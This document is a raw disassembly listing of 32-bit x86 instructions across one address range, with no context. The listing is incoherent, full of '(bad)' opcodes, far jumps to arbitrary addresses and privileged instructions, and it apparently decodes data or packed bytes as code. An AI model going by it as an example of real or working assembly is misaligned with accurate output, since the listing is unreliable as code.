  412224:	jmp    0xca51:0x5421c4ef
  41222b:	cdq    
  41222c:	aaa    
  41222d:	or     ebp,DWORD PTR [esi]
  41222f:	lods   eax,DWORD PTR ds:[esi]
  412230:	imul   esp,DWORD PTR [ebp-0xa5cd54c],0x1f8d8761
  41223a:	clc    
  41223b:	sti    
  41223c:	call   0xd9818520
  412241:	mov    edi,0x44685b0c
  412246:	aad    0xad
  412248:	daa    
  412249:	dec    ebx
  41224a:	popf   
  41224b:	sub    DWORD PTR ds:0x663bd9c3,ebp
  412251:	mov    cl,0xff
  412253:	add    edi,edi
  412255:	inc    eax
  412256:	pop    edx
  412257:	ret    
  412258:	shl    DWORD PTR [eax-0x79c98b3e],0xf
  41225f:	pop    ebp
  412260:	mov    bl,0x40
  412262:	fbld   TBYTE PTR [esi+0x28de312]
  412268:	fwait
  412269:	xchg   ebx,eax
  41226a:	xchg   ecx,eax
  41226b:	das    
  41226c:	mov    ah,0x65
  41226e:	fnstcw WORD PTR [edx-0x4c23dffb]
  412274:	and    esi,ebx
  412276:	xor    cl,dh
  412278:	xchg   ch,dl
  41227a:	xor    DWORD PTR [edx],ebp
  41227c:	push   0x1a
  41227e:	xchg   BYTE PTR [esi+edx*2-0x65],dh
  412282:	push   ebp
  412283:	test   al,0x7a
  412285:	mov    ds:0x2057277b,al
  41228a:	jno    0x412259
  41228c:	ret    
  41228d:	inc    eax
  41228e:	pop    esp
  41228f:	cmc    
  412290:	push   ecx
  412291:	pusha  
  412292:	mov    esp,0xc6d1dcff
  412297:	int    0x76
  412299:	mov    ds,WORD PTR [ecx-0x369a805a]
  41229f:	rcr    BYTE PTR [edi+0x16],1
  4122a2:	push   esi
  4122a3:	adc    al,0x52
  4122a5:	xor    eax,0x3a82210a
  4122aa:	fcmove st,st(2)
  4122ac:	push   ecx
  4122ad:	push   ecx
  4122ae:	int    0x24
  4122b0:	mov    dh,0xe
  4122b2:	jno    0x412327
  4122b4:	inc    eax
  4122b5:	ret    
  4122b6:	adc    eax,0x9c07e752
  4122bb:	(bad)  
  4122bc:	ds dec ebx
  4122be:	jge    0x412285
  4122c0:	fistp  QWORD PTR [eax]
  4122c2:	mov    edi,0xea6c834a
  4122c7:	xlat   BYTE PTR ds:[ebx]
  4122c8:	test   edx,eax
  4122ca:	jns    0x412255
  4122cc:	pop    edi
  4122cd:	pop    esi
  4122ce:	aad    0xbe
  4122d0:	neg    DWORD PTR [ebp-0x29fc93ef]
  4122d6:	mov    ch,0xe
  4122d8:	push   ebx
  4122d9:	push   ebx
  4122da:	xor    DWORD PTR [ebx+0x12e51648],ebx
  4122e0:	add    eax,0xfebac150
  4122e5:	fs push es
  4122e7:	mov    bl,0x40
  4122e9:	lahf   
  4122ea:	retf   0x3275
  4122ed:	xor    BYTE PTR [ebx+0x46b91f38],ch
  4122f3:	mov    ds:0x39b48027,al
  4122f8:	dec    ecx
  4122f9:	mov    edx,0x87a51bcb
  4122fe:	jmp    FWORD PTR [edx]
  412300:	shr    DWORD PTR [ebp+0x441ecb96],cl
  412306:	inc    ecx
  412307:	inc    esp
  412308:	(bad)  [ecx-0x11]
  41230b:	xchg   bh,bl
  41230d:	add    eax,0x2d926d46
  412312:	jbe    0x412354
  412314:	adc    eax,0xcbfe5685
  412319:	cwde   
  41231a:	inc    eax
  41231b:	add    eax,0x3a7b820
  412320:	inc    edi
  412321:	fadd   DWORD PTR [ebp-0x55]
  412324:	and    BYTE PTR [edx+edi*2-0x30003db8],ah
  41232b:	jg     0x412333
  41232d:	pop    ebp
  41232e:	ja     0x41239e
  412330:	out    dx,al
  412331:	xlat   BYTE PTR ds:[ebx]
  412332:	push   esp
  412333:	xchg   ebp,eax
  412334:	sbb    al,0xb8
  412336:	setns  bh
  412339:	ds or  eax,0xf0687b74
  41233f:	sub    ah,BYTE PTR es:[esi+ebp*8]
  412343:	rol    DWORD PTR [edx],0x65
  412346:	mov    eax,0xf05359f
  41234b:	push   0x865e2841
  412350:	jge    0x4122e6
  412352:	aad    0x83
  412354:	inc    ecx
  412355:	push   ss
  412356:	sbb    BYTE PTR [edi-0x55],al
  412359:	cdq    
  41235a:	dec    ebp
  41235b:	(bad)  
  41235c:	into   
  41235d:	xchg   esi,eax
  41235e:	aam    0xe4
  412360:	call   0xa3296ea7
  412365:	inc    esi
  412366:	shr    BYTE PTR ds:0xe84975a7,0x7b
  41236d:	push   esp
  41236e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41236f:	sbb    bl,ch
  412371:	repnz adc eax,0xd6f07060
  412377:	jbe    0x412302
  412379:	sub    eax,0x20e71a6a
  41237e:	inc    DWORD PTR [eax+edx*4+0x4d]
  412382:	or     DWORD PTR [esi-0x41c81d9a],ebx
  412388:	ret    0x7c96
  41238b:	add    DWORD PTR [edx+0x202c9346],ebp
  412391:	ret    0x885e
  412394:	arpl   WORD PTR ss:[ebx-0x49],bx
  412398:	jmp    DWORD PTR [esi-0x2a]
  41239b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41239c:	rcr    cl,1
  41239e:	mov    ah,0xd1
  4123a0:	xor    al,0x30
  4123a2:	stc    
  4123a3:	pop    esi
  4123a4:	add    bl,BYTE PTR [edi]
  4123a6:	popa   
  4123a7:	popf   
  4123a8:	std    
  4123a9:	pop    es
  4123aa:	xor    BYTE PTR [edx+0x27404b83],0x1
  4123b1:	sub    ebp,edi
  4123b3:	outs   dx,BYTE PTR ds:[esi]
  4123b4:	or     DWORD PTR [esi+0x52],ebx
  4123b7:	aam    0x37
  4123b9:	dec    ebx
  4123ba:	push   es
  4123bb:	mov    eax,ds:0x2963e133
  4123c0:	xchg   esi,eax
  4123c1:	and    BYTE PTR [eax-0x5f177cde],dl
  4123c7:	call   FWORD PTR [eax+0x4961db59]
  4123cd:	cwde   
  4123ce:	test   eax,0xd0605f58
  4123d3:	mov    al,0x7c
  4123d5:	or     esi,DWORD PTR [ebp-0x40da1335]
  4123db:	pop    esi
  4123dc:	xor    BYTE PTR [esp+esi*4],bl
  4123df:	dec    eax
  4123e0:	jns    0x41236e
  4123e2:	pop    esp
  4123e3:	cmp    edi,edx
  4123e5:	(bad)  
  4123e6:	rcr    BYTE PTR [esp+ebx*2+0x2d],1
  4123ea:	cmp    ebp,DWORD PTR [ecx-0x18de4fa8]
  4123f0:	mov    eax,0x967ea518
  4123f5:	mov    dh,0x9e
  4123f7:	and    BYTE PTR [edi-0x68],0x99
  4123fb:	pop    esp
  4123fc:	sbb    DWORD PTR [edx],edi
  4123fe:	and    DWORD PTR [edi+0x3c72da4d],0x270d69f
  412408:	nop
  412409:	dec    edi
  41240a:	test   eax,0x7dfee03c
  41240f:	mov    ebx,0x84ba8a99
  412414:	pusha  
  412415:	or     BYTE PTR [edi+0x7b4d1841],cl
  41241b:	add    BYTE PTR [ecx-0x25faffb2],dh
  412421:	dec    edi
  412422:	aaa    
  412423:	push   0x8
  412425:	dec    edi
  412426:	outs   dx,BYTE PTR ds:[esi]
  412427:	and    ecx,0x7bcb2206
  41242d:	push   0x75519f2c
  412432:	inc    ebx
  412433:	cmp    esi,DWORD PTR [ebx+0x6279d518]
  412439:	and    edi,esp
  41243b:	sub    al,BYTE PTR [ebp+0x44ce2872]
  412441:	iret   
  412442:	cwde   
  412443:	stos   DWORD PTR es:[edi],eax
  412444:	or     ebx,DWORD PTR fs:[esi-0x20]
  412448:	bound  ecx,QWORD PTR [eax-0x51e5870f]
  41244e:	in     eax,0x4d
  412450:	sbb    al,0x68
  412452:	lods   eax,DWORD PTR ds:[esi]
  412453:	push   ebp
  412454:	fsubr  QWORD PTR [ebp+0x2de9775b]
  41245a:	in     al,0x85
  41245c:	or     ebx,0xffffffe1
  41245f:	inc    esi
  412460:	xor    BYTE PTR [ebx+0x78],bh
  412463:	jo     0x41249e
  412465:	add    eax,0xcaa2b9fc
  41246a:	mov    ecx,0x9e03004f
  41246f:	stos   BYTE PTR es:[edi],al
  412470:	ret    
  412471:	stos   BYTE PTR es:[edi],al
  412472:	dec    esi
  412473:	scas   eax,DWORD PTR es:[edi]
  412474:	push   ss
  412475:	push   ds
  412476:	mov    BYTE PTR [edx+0x3995006a],dl
  41247c:	js     0x41246a
  41247e:	(bad)  
  41247f:	push   esp
  412480:	pop    edi
  412481:	dec    ebp
  412482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412483:	into   
  412484:	dec    edi
  412485:	fdivr  st(2),st
  412487:	lock (bad) 
  412489:	sti    
  41248a:	and    ecx,ecx
  41248c:	mov    cl,0xfe
  41248e:	rol    BYTE PTR [eax+esi*4+0x31a389f6],0x54
  412496:	jmp    0x4124aa
  412498:	scas   eax,DWORD PTR es:[edi]
  412499:	xor    edi,DWORD PTR [esi-0x28]
  41249c:	jg     0x4124d2
  41249e:	pop    ebx
  41249f:	jmp    0x4124f6
  4124a1:	add    al,0x3f
  4124a3:	leave  
  4124a4:	pop    eax
  4124a5:	sub    eax,eax
  4124a7:	mov    bh,0x45
  4124a9:	(bad)  
  4124ab:	js     0x412430
  4124ad:	stos   BYTE PTR es:[edi],al
  4124ae:	and    eax,DWORD PTR [edx-0x24bed19c]
  4124b4:	in     al,dx
  4124b5:	xor    eax,0x7412d3bb
  4124ba:	(bad)  
  4124bb:	stc    
  4124bc:	test   BYTE PTR [ebx+0xcd7c9e3],ah
  4124c2:	cmp    bh,BYTE PTR [edx]
  4124c4:	xor    bh,al
  4124c6:	mov    ds:0xe3a4abc3,eax
  4124cb:	xor    al,0xdd
  4124cd:	(bad)  
  4124ce:	jne    0x4124a0
  4124d0:	cmp    eax,0xc2d1d9e1
  4124d5:	mov    dh,al
  4124d7:	cmc    
  4124d8:	cmp    eax,DWORD PTR [edi-0x6ac359e4]
  4124de:	inc    edx
  4124df:	and    eax,0x9e05c0cf
  4124e4:	test   al,0x5b
  4124e6:	jne    0x4124c5
  4124e8:	jne    0x412513
  4124ea:	sbb    eax,DWORD PTR [esi]
  4124ec:	and    ebp,DWORD PTR [ecx+0x20c80ff5]
  4124f2:	pop    ebp
  4124f3:	sub    dl,0xc5
  4124f6:	in     eax,dx
  4124f7:	(bad)  
  4124f8:	dec    edx
  4124f9:	shl    BYTE PTR [eax+ebx*2-0x22],1
  4124fd:	adc    eax,0xf0fca043
  412502:	into   
  412503:	popf   
  412504:	inc    ecx
  412505:	jno    0x4124e0
  412507:	jmp    DWORD PTR [eax+ecx*1-0x4986e903]
  41250e:	lds    esp,FWORD PTR [eax+ebp*4]
  412511:	das    
  412512:	test   BYTE PTR [ebx-0x12],0xe9
  412516:	out    dx,eax
  412517:	fisubr WORD PTR [edx-0x2]
  41251a:	ror    DWORD PTR ds:0xcc002cba,1
  412520:	push   ebp
  412521:	adc    dl,bh
  412523:	scas   al,BYTE PTR es:[edi]
  412524:	call   edx
  412526:	and    dh,BYTE PTR [eax+0x5]
  412529:	jle    0x412557
  41252b:	jnp    0x4124c2
  41252d:	xchg   edx,eax
  41252e:	mov    ah,0xb
  412530:	fisub  DWORD PTR [edi+0x470a11d1]
  412536:	cs (bad) 
  412538:	sbb    eax,0x2a4411ed
  41253d:	outs   dx,BYTE PTR ds:[esi]
  41253e:	mov    eax,ds:0x8d906aa6
  412543:	inc    eax
  412544:	jb     0x412587
  412546:	cmp    BYTE PTR [edi-0x33],dh
  412549:	inc    edx
  41254a:	gs sbb ah,bl
  41254d:	push   esp
  41254e:	cmp    edi,DWORD PTR ds:0xab62ba1c
  412554:	jle    0x412502
  412556:	daa    
  412557:	inc    edi
  412558:	push   es
  412559:	loop   0x412514
  41255b:	(bad)  
  41255c:	shl    DWORD PTR [ebp+0x31],cl
  41255f:	bnd jae 0x412528
  412562:	pushf  
  412563:	mov    ebp,0x43013aab
  412568:	cmc    
  412569:	or     dl,al
  41256b:	sbb    BYTE PTR [eax],dh
  41256d:	dec    esi
  41256e:	addr16 inc ebp
  412570:	imul   ecx,DWORD PTR [ecx],0x7ae625af
  412576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412577:	dec    eax
  412578:	int    0x4f
  41257a:	rcl    DWORD PTR [esp+ebp*2],cl
  41257d:	idiv   ch
  41257f:	mov    ebp,0x31aa9ab1
  412584:	inc    ecx
  412585:	sbb    BYTE PTR [edi+0xa],0xb
  412589:	push   0x3a
  41258b:	stos   BYTE PTR es:[edi],al
  41258c:	dec    ebx
  41258d:	mov    cl,0x4b
  41258f:	dec    esp
  412590:	fsin   
  412592:	inc    ebx
  412593:	mov    ds:0x954dcdb2,al
  412598:	repnz (bad) 
  41259a:	aam    0x4d
  41259c:	jmp    0xf245:0xb31bb4cb
  4125a3:	out    0xfd,al
  4125a5:	cmc    
  4125a6:	dec    edi
  4125a7:	inc    ecx
  4125a8:	and    BYTE PTR [edx+0x6f],bh
  4125ab:	jmp    0xc2cbc9b6
  4125b0:	dec    ebx
  4125b1:	in     eax,dx
  4125b2:	fwait
  4125b3:	jl     0x4125b4
  4125b5:	jmp    0x5d79:0x8bab1b05
  4125bc:	loope  0x412597
  4125be:	mov    cl,BYTE PTR [ecx-0x7c]
  4125c1:	pop    edx
  4125c2:	das    
  4125c3:	add    BYTE PTR [esi+0x7c00d078],al
  4125c9:	inc    ebx
  4125ca:	sub    bl,bl
  4125cc:	aad    0xf5
  4125ce:	(bad)  
  4125cf:	and    DWORD PTR [ecx+0x37509077],ebp
  4125d5:	xchg   edx,eax
  4125d6:	out    0x27,eax
  4125d8:	pushf  
  4125d9:	cmp    DWORD PTR [ebx],esi
  4125db:	shr    DWORD PTR [esi-0x334d7935],cl
  4125e1:	popa   
  4125e2:	adc    BYTE PTR [esi],bh
  4125e4:	mov    eax,0xebab59a4
  4125e9:	pop    ecx
  4125ea:	(bad)  
  4125eb:	out    0x44,eax
  4125ed:	repnz pop ebp
  4125ef:	mov    ch,0x75
  4125f1:	ds out dx,eax
  4125f3:	xor    ah,BYTE PTR [ecx]
  4125f5:	dec    edx
  4125f6:	mov    al,ds:0x4117b419
  4125fb:	mov    edx,0xf0b5ce40
  412600:	bnd jge 0x4125ff
  412603:	ret    
  412604:	pop    esi
  412605:	sub    BYTE PTR [ecx+ecx*1-0x25],al
  412609:	(bad)  
  41260a:	iret   
  41260b:	or     BYTE PTR [ecx+ecx*8-0x6a83cc4f],cl
  412612:	aam    0xba
  412614:	shl    ebp,0xe3
  412617:	out    0x71,eax
  412619:	inc    esp
  41261a:	mov    ebx,0x21f362c2
  41261f:	pop    ss
  412620:	jne    0x412601
  412622:	mov    dh,0xdf
  412624:	jmp    0x412615
  412626:	sub    eax,0x55132c8e
  41262b:	pop    ds
  41262c:	fadd   DWORD PTR [ebp-0x1e]
  412630:	stos   BYTE PTR es:[edi],al
  412631:	jecxz  0x41265e
  412633:	adc    BYTE PTR [edx+esi*2+0x40],0x91
  412638:	jmp    0x1b18:0xce02865b
  41263f:	sub    DWORD PTR [esi],edi
  412641:	cmp    esp,eax
  412643:	lock cs or al,0x6c
  412647:	das    
  412648:	adc    BYTE PTR [ebp+0x79],dl
  41264b:	xor    DWORD PTR [edx+0x1b150f69],esi
  412651:	push   0x25b84362
  412656:	jnp    0x4126bc
  412658:	pop    esp
  412659:	fs repz pusha 
  41265c:	jl     0x4126da
  41265e:	jle    0x412695
  412660:	pop    es
  412661:	fsub   DWORD PTR [edx]
  412663:	mov    ebx,0xabab5716
  412668:	shl    DWORD PTR [eax+ecx*4],1
  41266b:	cmp    BYTE PTR [ebx],bl
  41266d:	mov    eax,0xdddec3fe
  412672:	mov    ds:0xa2fc3c1c,eax
  412677:	out    0x23,al
  412679:	(bad)  
  41267a:	pop    esp
  41267b:	mov    esp,DWORD PTR [eax-0x6673218b]
  412681:	mov    al,0x73
  412683:	xor    al,0x4b
  412685:	cmp    eax,0x1c92f604
  41268a:	out    dx,eax
  41268b:	js     0x4126b9
  41268d:	test   esi,edx
  41268f:	call   0xefe97dce
  412694:	mov    dh,0x48
  412696:	xchg   BYTE PTR ds:0x89e985b4,ch
  41269c:	fld    TBYTE PTR [ebx]
  41269e:	mov    ds:0xacbbed89,al
  4126a3:	dec    eax
  4126a4:	in     eax,0x4
  4126a6:	stos   DWORD PTR es:[edi],eax
  4126a7:	add    al,0x53
  4126a9:	cli    
  4126aa:	lods   al,BYTE PTR ds:[esi]
  4126ab:	pop    es
  4126ac:	pop    ecx
  4126ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ae:	inc    ecx
  4126af:	jmp    0x78380a0a
  4126b4:	inc    DWORD PTR [edx]
  4126b6:	xchg   ebx,eax
  4126b7:	(bad)  
  4126b9:	rcr    ebp,0x60
  4126bc:	jno    0x412725
  4126be:	push   ecx
  4126bf:	loopne 0x41270e
  4126c1:	aam    0xc4
  4126c3:	loop   0x41272d
  4126c5:	add    al,0x94
  4126c7:	ror    cl,0xd2
  4126ca:	into   
  4126cb:	enter  0x432a,0xdb
  4126cf:	imul   ebx,esi,0xffffff84
  4126d2:	call   0x54b8:0xe0d94b2a
  4126d9:	and    BYTE PTR [edx],cl
  4126db:	loopne 0x412671
  4126dd:	loope  0x4126e1
  4126df:	call   0xebf60982
  4126e4:	inc    edx
  4126e5:	jmp    0xa327:0xa09f88f3
  4126ec:	ss daa 
  4126ee:	ins    BYTE PTR es:[edi],dx
  4126ef:	xlat   BYTE PTR ss:[ebx]
  4126f1:	jp     0x4126c7
  4126f3:	pop    ebp
  4126f4:	shr    DWORD PTR [ebp+0x164674e8],1
  4126fa:	push   edi
  4126fb:	fadd   st,st(2)
  4126fd:	adc    DWORD PTR [eax-0x17],ebx
  412700:	inc    esi
  412701:	sbb    ch,BYTE PTR [edx-0x13dceebb]
  412707:	test   al,0xe1
  412709:	inc    edi
  41270a:	sti    
  41270b:	mov    al,ds:0x7865073d
  412710:	jl     0x41272b
  412712:	jge    0x4126d8
  412714:	aam    0xc3
  412716:	or     eax,0x867d0607
  41271b:	inc    esp
  41271c:	inc    edi
  41271d:	data16 shl BYTE PTR [ebp-0x6c4ac20b],0xd1
  412725:	sbb    al,0x77
  412727:	mov    ds:0x43285ed0,eax
  41272c:	jl     0x4126bb
  41272e:	pop    ds
  41272f:	sub    eax,0xdcdc1e05
  412734:	das    
  412735:	xor    eax,0xdebd3bd8
  41273a:	pop    ds
  41273b:	mov    ebp,0x42acde47
  412740:	sub    BYTE PTR [ecx+edx*1+0x256f9566],cl
  412747:	pop    edi
  412748:	outs   dx,DWORD PTR ds:[esi]
  412749:	push   0x1
  41274b:	push   esp
  41274c:	mov    esp,0x2fd278af
  412751:	rcr    BYTE PTR [ecx],1
  412753:	(bad)  
  412754:	jle    0x412745
  412756:	xor    BYTE PTR [eax],dh
  412758:	cmp    BYTE PTR ds:[ebx+ebp*4+0x6337f83a],cl
  412760:	push   eax
  412761:	out    dx,eax
  412762:	fldz   
  412764:	div    DWORD PTR [edi-0x78fbcd3a]
  41276a:	mov    eax,ds:0xf253f4d3
  41276f:	mov    bl,0x28
  412771:	sub    BYTE PTR [esi],dl
  412773:	push   esp
  412774:	xchg   ebx,eax
  412775:	add    DWORD PTR [eax+0x41],0xeb8e0c27
  41277c:	inc    edi
  41277d:	cmp    ebp,esp
  41277f:	adc    al,dh
  412781:	jmp    0x4127d2
  412783:	mov    esp,DWORD PTR [ecx]
  412785:	dec    eax
  412786:	push   edx
  412787:	jg     0x41273b
  412789:	les    esp,FWORD PTR [ebx]
  41278b:	cld    
  41278c:	bound  esp,QWORD PTR [eax-0x3a]
  41278f:	and    al,BYTE PTR [ecx-0x58]
  412792:	sbb    BYTE PTR [edi-0x52183e23],0xab
  412799:	and    dl,al
  41279b:	lea    ebx,es:[ecx+0x61]
  41279f:	dec    ebp
  4127a0:	sub    al,0xb0
  4127a2:	retf   0x7eb6
  4127a5:	ins    BYTE PTR es:[edi],dx
  4127a6:	fwait
  4127a7:	mov    bl,0xfb
  4127a9:	addr16 clts 
  4127ac:	es dec edx
  4127ae:	jmp    0x4127bf
  4127b0:	mov    ah,0xbe
  4127b2:	ds leave 
  4127b4:	js     0x41279b
  4127b6:	xchg   edx,eax
  4127b7:	jge    0x4127b5
  4127b9:	cmp    BYTE PTR [edx+0x3d],ch
  4127bc:	lock ret 0x5f5a
  4127c0:	scas   eax,DWORD PTR es:[edi]
  4127c1:	sub    bl,BYTE PTR [edi-0x22]
  4127c4:	jmp    0x4ad4:0x5f0efa02
  4127cb:	mov    DWORD PTR [ebp+0x7a],esi
  4127ce:	jo     0x41283c
  4127d0:	add    eax,0xb89c330d
  4127d5:	mov    ebx,0x45435721
  4127da:	push   ebx
  4127db:	jmp    0x4fd2332c
  4127e0:	popf   
  4127e1:	mov    bh,0x55
  4127e3:	addr16 pop eax
  4127e5:	sub    eax,0xeeec16ee
  4127ea:	dec    ecx
  4127eb:	push   edx
  4127ec:	sbb    edi,DWORD PTR [eax-0x5d5cfcd8]
  4127f2:	not    dl
  4127f4:	popf   
  4127f5:	cdq    
  4127f6:	jmp    0x643f:0x3e8ab2f8
  4127fd:	retf   
  4127fe:	fimul  WORD PTR [edx-0x71]
  412801:	(bad)  
  412802:	sbb    DWORD PTR [edi-0x76745993],esp
  412808:	jns    0x412853
  41280a:	repz int3 
  41280c:	iret   
  41280d:	xor    DWORD PTR [ebx-0x2e],ebx
  412810:	aam    0xc2
  412812:	les    ebp,FWORD PTR [ebx+0x20]
  412815:	or     al,0xb1
  412817:	jnp    0x4127f3
  412819:	add    eax,0x1d3c3b21
  41281e:	add    cl,BYTE PTR [edx+0x8387b8c]
  412824:	mov    edx,0x98886a9f
  412829:	add    bl,BYTE PTR [eax+0x39]
  41282c:	je     0x412845
  41282e:	idiv   BYTE PTR [ecx-0x1d]
  412831:	mov    bl,0x1a
  412833:	daa    
  412834:	add    BYTE PTR [eax],cl
  412836:	sbb    al,0xd0
  412838:	or     eax,ebx
  41283a:	dec    ecx
  41283b:	not    bh
  41283d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41283e:	pop    eax
  41283f:	mov    ebp,0xb9ad25ec
  412844:	call   0x841:0x67d6a32a
  41284b:	int    0x3e
  41284d:	mov    edx,ebp
  41284f:	jae    0x412846
  412851:	aas    
  412852:	and    DWORD PTR [edi],ebp
  412854:	ror    DWORD PTR [ecx+0x1f],cl
  412857:	push   0x95bb8bc5
  41285c:	(bad)  
  41285d:	nop
  41285e:	aaa    
  41285f:	ins    BYTE PTR es:[edi],dx
  412860:	and    cl,BYTE PTR [ecx+0x434b66f9]
  412866:	xchg   DWORD PTR [edi-0x123caf41],ebp
  41286c:	out    dx,al
  41286d:	cld    
  41286e:	cli    
  41286f:	fbstp  TBYTE PTR [esi-0x151215cd]
  412875:	pop    ds
  412876:	cmp    eax,ebx
  412878:	rcl    BYTE PTR [eax+0x0],1
  41287b:	dec    esp
  41287c:	and    eax,DWORD PTR [edx+0x10ebaf0f]
  412882:	and    BYTE PTR [ecx+0x31],ah
  412885:	sub    DWORD PTR [ebx],esp
  412887:	dec    edx
  412888:	inc    edx
  412889:	fwait
  41288a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41288b:	xor    eax,0xddce55bd
  412890:	test   ebx,ebx
  412892:	inc    edx
  412893:	mov    eax,0xed48818a
  412898:	test   BYTE PTR [eax],bl
  41289a:	imul   ebx,eax,0x64
  41289d:	scas   al,BYTE PTR es:[edi]
  41289e:	pop    ebx
  41289f:	rcr    BYTE PTR ss:[edi+ebx*1],cl
  4128a3:	nop
  4128a4:	popa   
  4128a5:	je     0x412902
  4128a7:	jge    0x4128c3
  4128a9:	adc    eax,0xae230169
  4128ae:	test   eax,0xe037f2b7
  4128b3:	sbb    edx,DWORD PTR [ebx+0x63]
  4128b6:	push   ss
  4128b7:	cmp    DWORD PTR [edx-0x2a00da54],esp
  4128bd:	jne    0x412909
  4128bf:	mov    ecx,0x20bb7ac5
  4128c4:	cwde   
  4128c5:	fdivr  QWORD PTR [edx-0x4c0d3f30]
  4128cb:	mov    dl,0x40
  4128cd:	(bad)
  4128d1:	push   cs
  4128d2:	int3   
  4128d3:	push   ss
  4128d4:	stos   BYTE PTR es:[edi],al
  4128d5:	ret    
  4128d6:	daa    
  4128d7:	adc    al,0x3e
  4128d9:	inc    edx
  4128da:	pop    ecx
  4128db:	mov    WORD PTR [eax+eiz*2-0x79035952],?
  4128e2:	lock inc ebx
  4128e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128e5:	add    DWORD PTR [edi+0x434ed038],0xffffffa0
  4128ec:	xor    DWORD PTR [ecx+0x2a640d3],eax
  4128f2:	shl    DWORD PTR [ecx+0x34],1
  4128f5:	out    dx,eax
  4128f6:	ins    DWORD PTR es:[edi],dx
  4128f7:	addr16 dec edx
  4128f9:	nop
  4128fa:	movhps QWORD PTR [edx+0x17],xmm4
  4128fe:	xchg   ebp,eax
  4128ff:	jg     0x412970
  412901:	lods   al,BYTE PTR ds:[esi]
  412902:	(bad)  
  412903:	mov    ecx,0xe13ed71b
  412908:	pop    edx
  412909:	ret    0x363b
  41290c:	jns    0x412891
  41290e:	push   cs
  41290f:	jno    0x4128b6
  412911:	inc    ecx
  412912:	out    dx,eax
  412913:	pop    ds
  412914:	fisubr WORD PTR [ebx+edi*1+0x1c1e3aa1]
  41291b:	out    dx,al
  41291c:	out    dx,eax
  41291d:	push   edx
  41291e:	inc    DWORD PTR [ecx+0x33ca83b3]
  412924:	iret   
  412925:	or     cl,BYTE PTR [ebx-0x4d]
  412928:	dec    eax
  412929:	cmp    edi,eax
  41292b:	and    BYTE PTR [ecx-0x4d],ah
  41292e:	jle    0x412912
  412930:	sbb    bl,BYTE PTR ds:0xc85e449d
  412936:	add    DWORD PTR [eax],0x49
  412939:	fmul   QWORD PTR [esi]
  41293b:	addr16 pop ecx
  41293d:	xchg   ebp,eax
  41293e:	mov    esi,DWORD PTR [ebx]
  412940:	outs   dx,DWORD PTR ds:[esi]
  412941:	dec    esi
  412942:	or     DWORD PTR [ecx],0x7b6a19e4
  412948:	sysexit 
  41294a:	jns    0x4128ee
  41294c:	(bad)  
  41294e:	xlat   BYTE PTR ds:[ebx]
  41294f:	pop    eax
  412950:	sub    edi,ebp
  412952:	push   ebp
  412953:	pop    edx
  412954:	lods   eax,DWORD PTR ds:[esi]
  412955:	mov    ds:0xb0691941,al
  41295a:	xlat   BYTE PTR ds:[ebx]
  41295b:	in     al,dx
  41295c:	pop    edx
  41295d:	ds call 0xeae40563
  412963:	inc    esi
  412964:	leave  
  412965:	mov    esi,0x1aa4a1e5
  41296a:	dec    edi
  41296b:	add    ah,bh
  41296d:	sbb    ch,al
  41296f:	retf   0x2a91
  412972:	adc    BYTE PTR [ebp-0x24718e50],bh
  412978:	mov    bl,0xc4
  41297a:	retf   0xa499
  41297d:	lds    eax,FWORD PTR [ebx-0x46]
  412980:	out    dx,eax
  412981:	dec    ecx
  412982:	inc    edx
  412983:	icebp  
  412984:	repz jp 0x412942
  412987:	mov    al,0x74
  412989:	sti    
  41298a:	jae    0x412a0b
  41298c:	leave  
  41298d:	jno    0x412933
  41298f:	out    dx,eax
  412990:	xor    BYTE PTR [ecx],bh
  412992:	mov    eax,ebx
  412994:	inc    eax
  412995:	push   edi
  412996:	jno    0x41292e
  412998:	pop    esp
  412999:	adc    BYTE PTR [edx+0x25f0e5b],bl
  41299f:	out    0xd5,al
  4129a1:	fwait
  4129a2:	mov    eax,0x9b6e2025
  4129a7:	push   eax
  4129a8:	inc    ebx
  4129a9:	xchg   DWORD PTR [edi+ebp*4+0x19027cb6],edi
  4129b0:	sbb    eax,DWORD PTR [ecx-0xc]
  4129b3:	jp     0x412a15
  4129b5:	add    BYTE PTR [ebp+0xb],0xa8
  4129b9:	mov    bh,0x39
  4129bb:	sub    al,0xd7
  4129bd:	jp     0x412977
  4129bf:	add    al,BYTE PTR [eax-0x4fed103c]
  4129c5:	or     DWORD PTR cs:[eax],ecx
  4129c8:	test   al,0x69
  4129ca:	xchg   edx,eax
  4129cb:	rcl    DWORD PTR [ebx-0x14cb0519],0x17
  4129d2:	add    esi,eax
  4129d4:	(bad)  
  4129d5:	dec    cx
  4129d7:	pop    eax
  4129d8:	inc    esi
  4129d9:	jge    0x412a06
  4129db:	dec    ebp
  4129dc:	pusha  
  4129dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129de:	stc    
  4129df:	xor    DWORD PTR [esi],ebp
  4129e1:	adc    BYTE PTR [esi+0x6b],0x95
  4129e5:	ror    cl,0x44
  4129e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129e9:	jmp    0xb077:0x2c686d63
  4129f0:	stos   DWORD PTR es:[edi],eax
  4129f1:	inc    ecx
  4129f2:	fmul   st(4),st
  4129f4:	mov    ds:0x561b9544,al
  4129f9:	pop    esp
  4129fa:	push   eax
  4129fb:	adc    DWORD PTR [ebx-0x1a],0x1f
  4129ff:	(bad)  
  412a00:	jecxz  0x412a3d
  412a02:	test   al,0x2f
  412a04:	cmp    DWORD PTR [esi+0x381e19df],eax
  412a0a:	fsub   DWORD PTR [eax]
  412a0c:	fisttp QWORD PTR [esi]
  412a0e:	int    0x90
  412a10:	popa   
  412a11:	jae    0x412a30
  412a13:	bound  esp,QWORD PTR [edi]
  412a15:	sahf   
  412a16:	int3   
  412a17:	inc    ebp
  412a18:	sbb    BYTE PTR [edx-0xb],cl
  412a1b:	and    ebp,DWORD PTR [edx+0x10]
  412a1e:	add    DWORD PTR [edx+0x72],ebp
  412a21:	or     dl,BYTE PTR [ecx]
  412a23:	xor    cl,ch
  412a25:	mov    ebx,0x8e764269
  412a2a:	gs push edx
  412a2c:	mov    ebp,DWORD PTR [edi-0x22]
  412a2f:	jge    0x4129b7
  412a31:	mov    ds:0x8823d490,eax
